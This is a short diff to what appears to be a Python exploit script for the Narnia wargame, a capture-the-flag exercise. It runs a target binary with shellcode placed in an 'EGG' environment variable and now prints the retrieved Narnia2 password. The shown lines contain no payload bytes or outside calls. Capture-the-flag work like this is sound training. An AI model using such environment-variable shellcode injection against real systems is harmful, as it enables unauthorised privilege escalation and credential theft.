@@ -38,7 +38,8 @@ payload = shellcode
 p = s.process(executable=config['executable'],
               env={'EGG': payload},
               raw=True)
-print(p.recvall())
+p.recvline()
+print('Narnia2 password: {}'.format(p.recvline()))
 
 p.close()
 s.close()
